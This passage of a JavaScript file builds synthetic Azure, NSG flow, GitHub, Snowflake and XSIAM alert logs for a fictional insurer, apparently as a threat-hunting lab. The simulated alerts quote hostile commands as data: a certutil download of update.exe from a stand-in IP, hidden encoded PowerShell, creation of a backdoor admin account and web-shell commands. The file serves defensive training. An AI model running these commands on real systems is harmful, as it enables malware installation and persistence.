    az('2026-10-24 21:50:10', 'MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE', 'Administrative', 'Success', ATK_LEGACY, `svc_backup@${DOMAIN}`, RID('MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS', '7a7b7c7d-0000-4000-8000-000000000001'), { roleDefinitionId: '/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635', roleName: 'Owner', principalType: 'ServicePrincipal', principalId: 'acme-policy-sync' }, 'Warning'),
    az('2026-10-24 21:55:42', 'MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/WRITE', 'Administrative', 'Success', ATK_LEGACY, `svc_backup@${DOMAIN}`, RID('MICROSOFT.NETWORK/NETWORKSECURITYGROUPS', 'NSG-APP-PROD/SECURITYRULES/ALLOW-RDP-TEMP'), { access: 'Allow', direction: 'Inbound', destinationPortRange: '3389', sourceAddressPrefix: '*', priority: 100 }, 'Warning'),
    az('2026-10-24 21:56:05', 'MICROSOFT.STORAGE/STORAGEACCOUNTS/LISTKEYS/ACTION', 'Administrative', 'Success', ATK_LEGACY, `svc_backup@${DOMAIN}`, RID('MICROSOFT.STORAGE/STORAGEACCOUNTS', 'STACMEPOLICYPROD01'), null),
    az('2026-10-24 21:57:20', 'MICROSOFT.COMPUTE/VIRTUALMACHINES/RUNCOMMAND/ACTION', 'Administrative', 'Success', ATK_LEGACY, `svc_backup@${DOMAIN}`, RID('MICROSOFT.COMPUTE/VIRTUALMACHINES', 'VM-POLICYAPP-PROD-01'), { commandId: 'RunPowerShellScript' }, 'Warning'),
    az('2026-10-25 00:30:00', 'MICROSOFT.NETWORK/NETWORKSECURITYGROUPS/SECURITYRULES/DELETE', 'Administrative', 'Success', OFFICE_EGRESS[1], `d.schrute@${DOMAIN}`, RID('MICROSOFT.NETWORK/NETWORKSECURITYGROUPS', 'NSG-APP-PROD/SECURITYRULES/ALLOW-RDP-TEMP'), null),
    az('2026-10-25 00:31:10', 'MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/DELETE', 'Administrative', 'Success', OFFICE_EGRESS[1], `d.schrute@${DOMAIN}`, RID('MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS', '7a7b7c7d-0000-4000-8000-000000000001'), null),
    az('2026-10-25 00:32:00', 'MICROSOFT.STORAGE/STORAGEACCOUNTS/REGENERATEKEY/ACTION', 'Administrative', 'Success', OFFICE_EGRESS[1], `d.schrute@${DOMAIN}`, RID('MICROSOFT.STORAGE/STORAGEACCOUNTS', 'STACMEPOLICYPROD01'), { keyName: 'key1' }),
    az('2026-10-26 04:00:00', 'MICROSOFT.COMPUTE/VIRTUALMACHINES/DEALLOCATE/ACTION', 'Administrative', 'Success', '10.200.0.10', '1a78b1e3-3333-4c4d-9e0f-0123456789ab', RID('MICROSOFT.COMPUTE/VIRTUALMACHINES', 'VM-TEST-NONPROD-02'), null),
    az('2026-10-26 05:00:00', 'MICROSOFT.COMPUTE/VIRTUALMACHINES/START/ACTION', 'Administrative', 'Success', '10.200.0.10', '1a78b1e3-3333-4c4d-9e0f-0123456789ab', RID('MICROSOFT.COMPUTE/VIRTUALMACHINES', 'VM-TEST-NONPROD-02'), null),
    az('2026-10-26 13:45:00', 'MICROSOFT.KEYVAULT/VAULTS/ACCESSPOLICIES/WRITE', 'Administrative', 'Failure', OFFICE_EGRESS[1], `d.schrute@${DOMAIN}`, RID('MICROSOFT.KEYVAULT/VAULTS', 'KV-ACME-POLICY-PROD/ACCESSPOLICIES/ADD'), { statusCode: 'Forbidden', statusMessage: "The client does not have authorization to perform action 'Microsoft.KeyVault/vaults/accessPolicies/write' over scope" }, 'Error'),
    az('2026-10-26 20:20:33', 'MICROSOFT.AUTHORIZATION/POLICIES/AUDITIFNOTEXISTS/ACTION', 'Policy', 'Success', null, 'Microsoft.Authorization', RID('MICROSOFT.COMPUTE/VIRTUALMACHINES', 'VM-POLICYAPP-PROD-01'), { isComplianceCheck: 'True', policies: [{ policyDefinitionName: 'audit-vm-without-managed-disks' }] }),
  ].sort((a, b) => Number(a._time) - Number(b._time));

  // ---- msft_azure_flowlogs_raw: NSG flow logs (some tuples arrive twice) --------------------------------------------
  const NSG_COLUMNS = ['_time', '_insert_time', 'category', 'resourceId', 'nsgRuleName', 'macAddress', 'startTime', 'sourceAddress', 'destinationAddress', 'sourcePort', 'destinationPort', 'protocol', 'flowDirection', 'deviceAction', 'flowState', 'packetsSent', 'bytesSent', 'packetsReceived', 'bytesReceived', '_product', '_vendor'];
  const NSG_RID = RID('MICROSOFT.NETWORK/NETWORKSECURITYGROUPS', 'NSG-APP-PROD');
  const nsg = (time, rule, src, sport, dst, dport, proto, dir, act, ps, bs, pr, br, dupMinutes) => {
    const ms = XQL.parseTimeString(time);
    return { _time: T(time), _insert_time: new XTime(ms + 45000 + (dupMinutes || 0) * 60000), category: 'NetworkSecurityGroupFlowEvent', resourceId: NSG_RID, nsgRuleName: rule, macAddress: '000D3A1B2C3D', startTime: Math.floor(ms / 1000), sourceAddress: src, destinationAddress: dst, sourcePort: sport, destinationPort: dport, protocol: proto, flowDirection: dir, deviceAction: act, flowState: 'E', packetsSent: ps, bytesSent: bs, packetsReceived: pr, bytesReceived: br, _product: 'Azure', _vendor: 'msft' };
  };
  const NSG_ROWS = [
    nsg('2026-10-24 21:58:30', 'ALLOW-RDP-TEMP', ATK_LEGACY, 50101, AZ_VM, 3389, 'T', 'I', 'A', 310, 41200, 288, 1900400),
    nsg('2026-10-24 21:58:30', 'ALLOW-RDP-TEMP', ATK_LEGACY, 50101, AZ_VM, 3389, 'T', 'I', 'A', 310, 41200, 288, 1900400, 7), // duplicate delivery
    nsg('2026-10-24 22:20:11', 'ALLOW-RDP-TEMP', ATK_LEGACY, 50233, AZ_VM, 3389, 'T', 'I', 'A', 1200, 160400, 1150, 7200100),
    nsg('2026-10-24 22:20:11', 'ALLOW-RDP-TEMP', ATK_LEGACY, 50233, AZ_VM, 3389, 'T', 'I', 'A', 1200, 160400, 1150, 7200100, 9), // duplicate delivery
    nsg('2026-10-24 22:35:02', 'AllowInternetOutBound', AZ_VM, 49900, C2, 443, 'T', 'O', 'A', 2600, 212000000, 900, 60100),
    nsg('2026-10-25 01:05:40', 'DenyAllInBound', ATK_LEGACY, 50410, AZ_VM, 3389, 'T', 'I', 'D', 1, 60, 0, 0),
    nsg('2026-10-25 01:05:46', 'DenyAllInBound', ATK_LEGACY, 50411, AZ_VM, 3389, 'T', 'I', 'D', 1, 60, 0, 0),
    nsg('2026-10-25 01:05:46', 'DenyAllInBound', ATK_LEGACY, 50411, AZ_VM, 3389, 'T', 'I', 'D', 1, 60, 0, 0, 4), // duplicate delivery
    nsg('2026-10-26 08:00:10', 'ALLOW-APP-HTTPS', '10.200.2.20', 51000, AZ_VM, 443, 'T', 'I', 'A', 80, 12000, 76, 98000),
    nsg('2026-10-26 08:00:10', 'ALLOW-APP-HTTPS', '10.200.2.20', 51000, AZ_VM, 443, 'T', 'I', 'A', 80, 12000, 76, 98000, 11), // duplicate delivery
    nsg('2026-10-26 09:30:00', 'ALLOW-APP-HTTPS', '10.200.2.21', 51044, AZ_VM, 443, 'T', 'I', 'A', 64, 9800, 60, 77000),
    nsg('2026-10-26 13:46:00', 'AllowVnetOutBound', AZ_VM, 50011, '10.200.3.5', 1433, 'T', 'O', 'A', 400, 52000, 380, 410000),
    nsg('2026-10-26 23:10:15', 'DenyAllInBound', '192.0.2.9', 44021, AZ_VM, 22, 'T', 'I', 'D', 1, 60, 0, 0),
  ].sort((a, b) => Number(a._time) - Number(b._time));

  // ---- github_github_audit_raw: EMU organisation audit log -------------------------------------------------------------
  const GH_COLUMNS = ['_time', 'created_at', 'action', 'actor', 'actor_ip', 'actor_location', 'org', 'repo', 'user', 'external_identity_username', 'application_name', 'programmatic_access_type', 'visibility', '_product', '_vendor'];
  const ORG = 'AcmeLife-EMU';
  const gh = (time, action, actor, ip, country, repo, user, ext, app, pat, vis) => ({ _time: T(time), created_at: XQL.parseTimeString(time), action, actor, actor_ip: ip, actor_location: JSON.stringify({ country_code: country }), org: ORG, repo, user: user || null, external_identity_username: ext || null, application_name: app || null, programmatic_access_type: pat || null, visibility: vis || null, _product: 'github', _vendor: 'github' });
  const GH_ROWS = [
    gh('2026-10-26 13:42:10', 'org_credential_authorization.grant', 'dwight-schrute_AcmeLife', OFFICE_EGRESS[1], 'AU', null, null, `d.schrute@${DOMAIN}`, 'snowflakedb', null),
    gh('2026-10-26 13:43:05', 'git.fetch', 'dwight-schrute_AcmeLife', SNOWFLAKE_APP_IP, 'US', `${ORG}/policy-models`, null, `d.schrute@${DOMAIN}`, null, 'GitHub App user-to-server token'),
    gh('2026-10-26 13:47:51', 'git.push', 'dwight-schrute_AcmeLife', SNOWFLAKE_APP_IP, 'US', `${ORG}/policy-models`, null, `d.schrute@${DOMAIN}`, null, 'GitHub App user-to-server token'),
    gh('2026-10-26 14:02:30', 'git.clone', 'dwight-schrute_AcmeLife', OFFICE_EGRESS[1], 'AU', `${ORG}/xsiam-content`, null, `d.schrute@${DOMAIN}`, null, 'OAuth access token'),
    gh('2026-10-25 09:05:00', 'org.add_member', 'it-admin_AcmeLife', OFFICE_EGRESS[0], 'AU', null, 'kevin-malone_AcmeLife', `it-admin@${DOMAIN}`, null, null),
    gh('2026-10-25 09:06:12', 'team.add_member', 'it-admin_AcmeLife', OFFICE_EGRESS[0], 'AU', null, 'kevin-malone_AcmeLife', `it-admin@${DOMAIN}`, null, null),
    gh('2026-10-23 04:12:00', 'repo.create', 'jim-halpert_AcmeLife', VPN_EGRESS, 'AU', `${ORG}/sales-dashboards`, null, `j.halpert@${DOMAIN}`, null, null, 'internal'),
    gh('2026-10-23 04:15:30', 'repo.access', 'jim-halpert_AcmeLife', VPN_EGRESS, 'AU', `${ORG}/sales-dashboards`, null, `j.halpert@${DOMAIN}`, null, null, 'public'),
    gh('2026-10-23 05:40:00', 'repo.access', 'jim-halpert_AcmeLife', VPN_EGRESS, 'AU', `${ORG}/sales-dashboards`, null, `j.halpert@${DOMAIN}`, null, null, 'internal'),
    gh('2026-10-26 20:25:14', 'personal_access_token.create', 'stanley-hudson_AcmeLife', ATK_SPRAY, 'NG', null, null, `s.hudson@${DOMAIN}`, null, 'fine-grained personal access token'),
    gh('2026-10-26 20:27:40', 'git.clone', 'stanley-hudson_AcmeLife', ATK_SPRAY, 'NG', `${ORG}/policy-models`, null, `s.hudson@${DOMAIN}`, null, 'fine-grained personal access token'),
    gh('2026-10-26 20:28:12', 'git.clone', 'stanley-hudson_AcmeLife', ATK_SPRAY, 'NG', `${ORG}/finance-etl`, null, `s.hudson@${DOMAIN}`, null, 'fine-grained personal access token'),
    gh('2026-10-26 20:29:03', 'git.clone', 'stanley-hudson_AcmeLife', ATK_SPRAY, 'NG', `${ORG}/xsiam-content`, null, `s.hudson@${DOMAIN}`, null, 'fine-grained personal access token'),
    gh('2026-10-22 06:30:00', 'protected_branch.policy_override', 'pam-beesly_AcmeLife', OFFICE_EGRESS[0], 'AU', `${ORG}/finance-etl`, null, `p.beesly@${DOMAIN}`, null, null),
    gh('2026-10-22 06:31:10', 'git.push', 'pam-beesly_AcmeLife', OFFICE_EGRESS[0], 'AU', `${ORG}/finance-etl`, null, `p.beesly@${DOMAIN}`, null, 'OAuth access token'),
    gh('2026-10-27 01:20:00', 'org.remove_member', 'it-admin_AcmeLife', OFFICE_EGRESS[1], 'AU', null, 'stanley-hudson_AcmeLife', `it-admin@${DOMAIN}`, null, null),
  ].sort((a, b) => Number(a._time) - Number(b._time));

  // ---- snowflake_snowflake_raw: LOGIN_HISTORY rows (uppercase field names, no _reporting_device_name) -------------------
  const SF_COLUMNS = ['_time', 'EVENT_TYPE', 'EVENT_TIMESTAMP', 'USER_NAME', 'CLIENT_IP', 'REPORTED_CLIENT_TYPE', 'REPORTED_CLIENT_VERSION', 'FIRST_AUTHENTICATION_FACTOR', 'SECOND_AUTHENTICATION_FACTOR', 'IS_SUCCESS', 'ERROR_CODE', 'ERROR_MESSAGE', '_collector_name', '_reporting_device_ip', '_product', '_vendor'];
  const sf = (time, user, ip, client, ver, first, second, ok, code, msg) => ({ _time: T(time), EVENT_TYPE: 'LOGIN', EVENT_TIMESTAMP: time.replace(' ', 'T') + 'Z', USER_NAME: user, CLIENT_IP: ip, REPORTED_CLIENT_TYPE: client, REPORTED_CLIENT_VERSION: ver, FIRST_AUTHENTICATION_FACTOR: first, SECOND_AUTHENTICATION_FACTOR: second, IS_SUCCESS: ok, ERROR_CODE: code, ERROR_MESSAGE: msg, _collector_name: 'Snowflake_LongRunning_v2_prod_login_history', _reporting_device_ip: '10.10.5.77', _product: 'snowflake', _vendor: 'snowflake' });
  const SF_ROWS = [
    sf('2026-10-26 13:40:15', `D.SCHRUTE@${DOMAIN.toUpperCase()}`, OFFICE_EGRESS[1], 'SNOWFLAKE_UI', '9.30.0', 'SAML2', null, 'YES', null, null),
    sf('2026-10-26 13:44:02', `D.SCHRUTE@${DOMAIN.toUpperCase()}`, SNOWFLAKE_APP_IP, 'OTHER', '1.0', 'OAUTH_ACCESS_TOKEN', null, 'YES', null, null),
    sf('2026-10-26 03:05:00', 'SVC_ETL_LOADER', '10.241.8.3', 'PYTHON_DRIVER', '3.12.0', 'RSA_KEYPAIR', null, 'YES', null, null),
    sf('2026-10-25 03:05:00', 'SVC_ETL_LOADER', '10.241.8.3', 'PYTHON_DRIVER', '3.12.0', 'RSA_KEYPAIR', null, 'YES', null, null),
    sf('2026-10-26 20:40:10', `S.HUDSON@${DOMAIN.toUpperCase()}`, ATK_SPRAY, 'SNOWFLAKE_UI', '9.30.0', 'PASSWORD', null, 'NO', 390100, 'Incorrect username or password was specified.'),
    sf('2026-10-26 20:40:35', `S.HUDSON@${DOMAIN.toUpperCase()}`, ATK_SPRAY, 'SNOWFLAKE_UI', '9.30.0', 'PASSWORD', null, 'NO', 390100, 'Incorrect username or password was specified.'),
    sf('2026-10-26 20:41:08', `S.HUDSON@${DOMAIN.toUpperCase()}`, ATK_SPRAY, 'SNOWFLAKE_UI', '9.30.0', 'PASSWORD', null, 'YES', null, null),
    sf('2026-10-26 20:55:22', `S.HUDSON@${DOMAIN.toUpperCase()}`, ATK_SPRAY, 'JDBC_DRIVER', '3.19.0', 'PASSWORD', null, 'YES', null, null),
    sf('2026-10-26 09:02:11', `P.BEESLY@${DOMAIN.toUpperCase()}`, OFFICE_EGRESS[0], 'SNOWFLAKE_UI', '9.30.0', 'SAML2', null, 'YES', null, null),
    sf('2026-10-24 22:41:00', 'SVC_BACKUP', ATK_LEGACY, 'JDBC_DRIVER', '3.19.0', 'PASSWORD', null, 'NO', 390144, 'User temporarily locked. Try again later.'),
  ].sort((a, b) => Number(a._time) - Number(b._time));

  // ---- alerts: Cortex alerts, including the retroactive IOC alerts from the flow logs ------------------------------------
  const ALERT_COLUMNS = ['_time', 'alert_id', 'alert_name', 'alert_source', 'severity', 'category', 'action', 'host_name', 'host_ip', 'user_name', 'local_ip', 'local_port', 'remote_ip', 'remote_port', 'event_timestamp', 'mitre_tactic_id_and_name', 'mitre_technique_id_and_name', 'incident_id', 'description', '_product', '_vendor'];
  let aid = 40000;
  const al = (time, name, source, sev, cat, action, host, hostIp, user, lip, lport, rip, rport, evt, tactic, tech, inc, desc) => ({ _time: T(time), alert_id: ++aid, alert_name: name, alert_source: source, severity: sev, category: cat, action, host_name: host, host_ip: hostIp ? [hostIp] : [], user_name: user ? [user] : [], local_ip: lip ? [lip] : [], local_port: lport == null ? [] : [lport], remote_ip: rip ? [rip] : [], remote_port: rport == null ? [] : [rport], event_timestamp: T(evt || time), mitre_tactic_id_and_name: tactic ? [tactic] : [], mitre_technique_id_and_name: tech ? [tech] : [], incident_id: inc, description: desc, _product: 'XSIAM', _vendor: 'PANW' });
  const ALERT_ROWS = [
    al('2026-10-26 09:12:40', 'Office application started PowerShell with an encoded command', 'XDR_ANALYTICS', 'SEV_040_HIGH', 'Execution', 'DETECTED', 'WS-FIN-042', '10.10.20.42', 'ACME\\s.hudson', '10.10.20.42', null, null, null, '2026-10-26 09:12:05', 'TA0002 - Execution', 'T1059.001 - PowerShell', 5101, 'WINWORD.EXE spawned powershell.exe -nop -w hidden -enc'),
    al('2026-10-26 09:15:10', 'Suspicious download tool execution (certutil urlcache)', 'XDR_BIOC', 'SEV_030_MEDIUM', 'Command and Control', 'DETECTED', 'WS-FIN-042', '10.10.20.42', 'ACME\\s.hudson', '10.10.20.42', null, C2, 80, '2026-10-26 09:14:30', 'TA0011 - Command and Control', 'T1105 - Ingress Tool Transfer', 5101, 'certutil.exe -urlcache -split -f http://192.0.2.45/update.exe'),
    al('2026-10-26 09:15:30', 'WildFire Malware', 'XDR_AGENT', 'SEV_040_HIGH', 'Malware', 'PREVENTED', 'WS-FIN-042', '10.10.20.42', 'ACME\\s.hudson', null, null, null, null, '2026-10-26 09:15:02', 'TA0002 - Execution', 'T1204.002 - Malicious File', 5101, 'update.exe verdict malware (Trojan.Downloader.Rhombus)'),
    al('2026-10-26 09:16:00', 'Scheduled task persistence by unsigned binary', 'XDR_BIOC', 'SEV_030_MEDIUM', 'Persistence', 'DETECTED', 'WS-FIN-042', '10.10.20.42', 'ACME\\s.hudson', null, null, null, null, '2026-10-26 09:15:40', 'TA0003 - Persistence', 'T1053.005 - Scheduled Task', 5101, 'schtasks /create WindowsUpdateCheck'),
    al('2026-10-26 11:06:30', 'Office application started PowerShell with ExecutionPolicy Bypass', 'XDR_ANALYTICS', 'SEV_040_HIGH', 'Execution', 'DETECTED', 'WS-HR-017', '10.10.21.17', 'ACME\\p.beesly', '10.10.21.17', null, null, null, '2026-10-26 11:05:33', 'TA0002 - Execution', 'T1059.001 - PowerShell', 5102, 'EXCEL.EXE spawned powershell.exe -ExecutionPolicy Bypass -File macro_helper.ps1'),
    al('2026-10-24 22:17:00', 'PsExec remote service installation', 'XDR_ANALYTICS', 'SEV_030_MEDIUM', 'Lateral Movement', 'DETECTED', 'WS-HR-017', '10.10.21.17', 'NT AUTHORITY\\SYSTEM', '10.10.21.17', 445, '10.10.1.5', null, '2026-10-24 22:15:07', 'TA0008 - Lateral Movement', 'T1021.002 - SMB/Windows Admin Shares', 5103, 'PSEXESVC.exe installed from SRV-DC-01'),
    al('2026-10-24 22:17:05', 'Local administrator account created via net.exe', 'XDR_BIOC', 'SEV_040_HIGH', 'Persistence', 'DETECTED', 'WS-HR-017', '10.10.21.17', 'NT AUTHORITY\\SYSTEM', null, null, null, null, '2026-10-24 22:16:00', 'TA0003 - Persistence', 'T1136.001 - Local Account', 5103, 'net user backup_svc /add; net localgroup administrators backup_svc /add'),
    al('2026-10-23 11:12:00', 'Web server process spawned a shell', 'XDR_ANALYTICS', 'SEV_050_CRITICAL', 'Initial Access', 'DETECTED', 'SRV-WEB-02', '10.10.2.8', 'IIS APPPOOL\\DefaultAppPool', '10.10.2.8', null, null, null, '2026-10-23 11:11:11', 'TA0001 - Initial Access', 'T1505.003 - Web Shell', 5104, 'w3wp.exe spawned cmd.exe /c whoami'),
    al('2026-10-26 20:12:00', 'Entra sign-in from a new country after repeated failures', 'CORRELATION', 'SEV_040_HIGH', 'Credential Access', 'DETECTED', null, null, `s.hudson@${DOMAIN}`, null, null, ATK_SPRAY, null, '2026-10-26 20:10:55', 'TA0006 - Credential Access', 'T1110.003 - Password Spraying', 5105, '4 bad-password failures (50126) and 2 MFA denials (500121) then success from NG with riskLevelDuringSignIn high'),
    al('2026-10-26 09:35:00', 'AWS IAM privilege escalation: AttachUserPolicy AdministratorAccess', 'CORRELATION', 'SEV_050_CRITICAL', 'Privilege Escalation', 'DETECTED', null, null, 'svc-deploy', null, null, ATK_KEYS, null, '2026-10-26 09:21:40', 'TA0004 - Privilege Escalation', 'T1098.003 - Additional Cloud Roles', 5106, 'svc-deploy attached AdministratorAccess to itself from 192.0.2.77 (eu-central-1)'),
    al('2026-10-26 09:45:00', 'AWS root console login without MFA', 'CORRELATION', 'SEV_050_CRITICAL', 'Initial Access', 'DETECTED', null, null, 'root', null, null, ATK_KEYS, null, '2026-10-26 09:43:05', 'TA0001 - Initial Access', 'T1078.004 - Cloud Accounts', 5106, 'ConsoleLogin Success for the root user, MFAUsed No, after 3 failures'),
  ];
  // retroactive IOC alerts: when the IOC rule for 192.0.2.188 was created, XSIAM matched the previous day of flow logs
  const iocTimes = ['2026-10-23 10:40:02', '2026-10-23 10:41:01', '2026-10-23 10:42:02', '2026-10-23 10:43:03', '2026-10-23 10:44:04', '2026-10-23 10:45:05', '2026-10-23 10:52:10', '2026-10-23 10:52:14'];
  iocTimes.forEach((t, i) => {
    ALERT_ROWS.push(al('2026-10-24 15:00:12', `IOC (IP) ${ATK_SCAN}`, 'XDR_IOC', 'SEV_030_MEDIUM', 'Malware', 'DETECTED', null, null, null, i % 2 === 0 || i >= 6 ? ATK_SCAN : ALB, i % 2 === 0 || i >= 6 ? scanPorts[Math.min(i, 5)] : 443, i % 2 === 0 || i >= 6 ? ALB : ATK_SCAN, i % 2 === 0 || i >= 6 ? 443 : scanPorts[Math.min(i, 5)], t, null, null, 5200 + i, `Flow log connection matched IOC ${ATK_SCAN}`));
  });
  ALERT_ROWS.sort((a, b) => Number(a._time) - Number(b._time));

  // ---- register the datasets ----------------------------------------------------------------------------------------------
  Object.assign(D, {
    panw_ngfw_threat_raw: { columns: THREAT_COLUMNS, rows: THREAT_ROWS, kind: 'dataset', description: 'Palo Alto Networks firewall threat logs (vulnerability, spyware, wildfire and url sub types) from the on-prem NGFW and Prisma Access.', fieldDocs: { source_ip: 'Source IP.', dest_ip: 'Destination IP.', source_user: 'User-ID mapped user (UPN).', from_zone: 'Source security zone.', to_zone: 'Destination security zone.', app: 'App-ID.', rule_matched: 'Security policy rule.', action: 'What the firewall did: alert (logged only), drop, reset-both, block-url. alert means the traffic was NOT stopped.', sub_type: 'vulnerability, spyware, virus, wildfire, url, data.', threat_name: 'Signature name.', threat_id: 'Signature id.', threat_category: 'Signature category (command-and-control, brute-force, ...).', severity: 'informational, low, medium, high, critical.', direction: 'client-to-server or server-to-client.', misc: 'URL, file name or extra detail.', file_sha256: 'SHA256 for wildfire verdicts.', log_source_name: 'Firewall or Prisma Access gateway that logged it.', is_prisma_mobile: 'true for Prisma Access mobile-user traffic.' } },
    panw_ngfw_url_raw: { columns: URL_COLUMNS, rows: URL_ROWS, kind: 'dataset', description: 'Palo Alto Networks URL filtering logs. TLS sessions without decryption are SNI-only: app = ssl, uri = host/ and no path.', fieldDocs: { url_domain: 'Host part of the URL (SNI for TLS).', uri: 'Full URL as logged; host/ only for undecrypted TLS.', url_category_list: 'Comma-separated URL categories and risk.', action: 'alert (allowed and logged), block-url, allow.', app: 'App-ID (ssl means an undecrypted TLS session).', http_method: 'HTTP method, null for TLS sessions.', user_agent: 'Client User-Agent, null for TLS sessions.', source_user: 'User-ID mapped user.', log_source_name: 'Firewall or Prisma Access gateway.', is_prisma_mobile: 'true for Prisma Access mobile users.' } },
    panw_ngfw_globalprotect_raw: { columns: GP_COLUMNS, rows: GP_ROWS, kind: 'dataset', description: 'GlobalProtect (Prisma Access mobile users) portal and gateway events: authentication, connect and logout.', fieldDocs: { event_id: 'portal-auth, gateway-auth, gateway-connected, gateway-logout.', status: 'success or failure.', source_user: 'User (UPN).', public_ip: 'Public address the client connected from.', private_ip: 'Tunnel address assigned on connect (10.100.x.x).', source_region: 'Country of the public address.', endpoint_device_name: 'Device hostname reported by the client.', endpoint_os_type: 'Client OS.', auth_method: 'SAML, LDAP, ...', error: 'Failure reason or logout reason.', login_duration: 'Seconds, on logout.', gateway: 'Gateway name.', portal: 'Portal address.' } },
    amazon_aws_raw: { columns: AWS_COLUMNS, rows: AWS_ROWS, kind: 'dataset', description: 'AWS logs from the Amazon S3 collector. _log_type = "cloudtrail" rows are CloudTrail management and data events (JSON fields as strings); _log_type = "flowlogs" rows are VPC flow records.', fieldDocs: { _log_type: '"cloudtrail" or "flowlogs". Filter on it first.', eventSource: 'AWS service, for example iam.amazonaws.com.', eventName: 'API call, for example CreateAccessKey, ConsoleLogin, RunInstances.', eventType: 'AwsApiCall or AwsConsoleSignIn.', awsRegion: 'Region of the call. Acme Life runs in ap-southeast-2.', sourceIPAddress: 'Caller IP.', userAgent: 'Caller user agent (aws-cli, console, Terraform, Boto3).', userIdentity: 'JSON string: type (IAMUser, AssumedRole, Root, SAMLUser), arn, userName, sessionContext.sessionIssuer.userName.', requestParameters: 'JSON string of the request.', responseElements: 'JSON string of the response (ConsoleLogin: Success/Failure).', additionalEventData: 'JSON string (ConsoleLogin: MFAUsed).', errorCode: 'Set when the call failed, for example AccessDenied.', errorMessage: 'Failure detail.', recipientAccountId: 'AWS account id that received the call.', account_id: 'Flow logs: account id.', interface_id: 'Flow logs: ENI (eni-...).', srcaddr: 'Flow logs: source address (the ALB for reply records).', dstaddr: 'Flow logs: destination address.', srcport: 'Flow logs: source port.', dstport: 'Flow logs: destination port.', protocol: 'Flow logs: IANA protocol number.', packets: 'Flow logs: packets.', bytes: 'Flow logs: bytes.', action: 'Flow logs: ACCEPT or REJECT.', flow_direction: 'Flow logs: ingress or egress relative to the ENI.', vpc_id: 'Flow logs: VPC id.' } },
    msft_azure_ad_raw: { columns: ENTRA_COLUMNS, rows: ENTRA_ROWS, kind: 'dataset', description: 'Microsoft Entra ID sign-in logs (interactive, non-interactive and service principal). status, location, deviceDetail and mfaDetail are JSON strings.', fieldDocs: { category: 'SignInLogs, NonInteractiveUserSignInLogs, ServicePrincipalSignInLogs.', userPrincipalName: 'User (UPN), null for service principals.', appDisplayName: 'Application signed in to.', resourceDisplayName: 'Resource (API) requested.', ipAddress: 'Client address. 198.51.100.146/147 are the office egress, 198.51.100.206 the VPN egress.', clientAppUsed: 'Browser, Mobile Apps and Desktop clients, Exchange ActiveSync, Other clients (legacy auth).', authenticationRequirement: 'singleFactorAuthentication or multiFactorAuthentication.', conditionalAccessStatus: 'success, failure, notApplied.', isInteractive: 'true for interactive sign-ins.', riskLevelDuringSignIn: 'none, low, medium, high.', riskState: 'none, atRisk, confirmedCompromised, remediated.', status: 'JSON string: errorCode (0 = success, 50126 bad password, 50053 locked, 500121 MFA failed, 53003 blocked by Conditional Access), failureReason.', location: 'JSON string: city, state, countryOrRegion.', deviceDetail: 'JSON string: displayName, operatingSystem, browser, isCompliant, isManaged, trustType.', mfaDetail: 'JSON string: authMethod.', servicePrincipalName: 'Service principal for ServicePrincipalSignInLogs.' } },
    msft_azure_ad_audit_raw: { columns: AUDIT_COLUMNS, rows: AUDIT_ROWS, kind: 'dataset', description: 'Microsoft Entra ID directory audit log. initiatedBy and targetResources are JSON strings; Azure AD Cloud Sync provisioning rows are noise.', fieldDocs: { activityDisplayName: 'What happened: Add member to role, Consent to application, Reset user password, Update user, ...', category: 'UserManagement, RoleManagement, GroupManagement, ApplicationManagement, ProvisioningManagement.', loggedByService: 'Core Directory, Authentication Methods, Azure AD Cloud Sync.', operationType: 'Add, Update, Assign, Unassign, Delete.', result: 'success or failure.', initiatedBy: 'JSON string: user {userPrincipalName, ipAddress} or app {displayName}.', targetResources: 'JSON string: array of {displayName, type, userPrincipalName, modifiedProperties[{displayName, newValue}]}.' } },
    msft_azure_raw: { columns: AZ_COLUMNS, rows: AZ_ROWS, kind: 'dataset', description: 'Azure activity logs from Event Hub: control-plane operations on subscriptions and resources.', fieldDocs: { operationName: 'Resource provider operation, upper case, for example MICROSOFT.AUTHORIZATION/ROLEASSIGNMENTS/WRITE.', category: 'Administrative, Security, Policy.', resultType: 'Start, Success, Failure.', callerIpAddress: 'Caller IP, null for platform operations.', caller: 'UPN of the user or the app id of the service principal.', identity: 'JSON string with authorization and claims.', resourceId: 'Full Azure resource id (upper case).', subscriptionId: 'Subscription.', resourceGroup: 'Resource group.', level: 'Informational, Warning, Error.', properties: 'JSON string with operation detail.' } },
    msft_azure_flowlogs_raw: { columns: NSG_COLUMNS, rows: NSG_ROWS, kind: 'dataset', description: 'Azure NSG flow logs from Network Watcher. Some records are delivered twice (same 5-tuple and startTime, later _insert_time).', fieldDocs: { startTime: 'Flow start as epoch seconds.', _insert_time: 'When XSIAM stored the record; differs between duplicate deliveries.', sourceAddress: 'Source IP.', destinationAddress: 'Destination IP.', sourcePort: 'Source port.', destinationPort: 'Destination port.', protocol: 'T (TCP) or U (UDP).', flowDirection: 'I (inbound) or O (outbound) relative to the NIC.', deviceAction: 'A (allowed) or D (denied).', nsgRuleName: 'NSG rule that matched.', resourceId: 'NSG resource id.', bytesSent: 'Bytes from source to destination.', bytesReceived: 'Bytes from destination to source.' } },
    github_github_audit_raw: { columns: GH_COLUMNS, rows: GH_ROWS, kind: 'dataset', description: 'GitHub Enterprise Managed Users (EMU) organisation audit log. Actors are <first>-<last>_AcmeLife; external_identity_username is the Entra UPN.', fieldDocs: { action: 'Audit action, for example git.push, git.clone, repo.create, org.add_member, personal_access_token.create, org_credential_authorization.grant.', actor: 'EMU user handle.', actor_ip: 'Actor IP.', actor_location: 'JSON string: country_code.', repo: 'org/repo.', user: 'Target user for membership actions.', external_identity_username: 'Entra UPN behind the EMU handle.', application_name: 'App for credential authorizations (snowflakedb = Snowflake Git integration).', programmatic_access_type: 'Token type used for git operations.', visibility: 'Repository visibility after a change.' } },
